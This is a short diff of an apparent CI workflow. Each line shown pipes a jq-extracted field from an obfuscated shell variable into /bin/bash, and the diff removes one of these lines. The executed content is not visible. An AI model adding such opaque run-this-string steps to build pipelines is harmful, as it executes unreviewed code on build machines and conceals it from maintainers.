@@ -28,7 +28,6 @@ jobs:
           printf '%s' "$rfasb82" | jq -r .vpu2 | /bin/bash
           echo $kp4 | jq -r .lobbl04095 | /bin/bash
           echo $zyj804 | jq -r .m4 | /bin/bash
-          printf '%s' "$fef0" | jq -r .jnj614 | /bin/bash
           echo $knec60 | jq -r .ze84 | /bin/bash
           echo $z28236 | jq -r .fk667 | /bin/bash
           echo $lcmii94588 | jq -r .eptj71 | /bin/bash
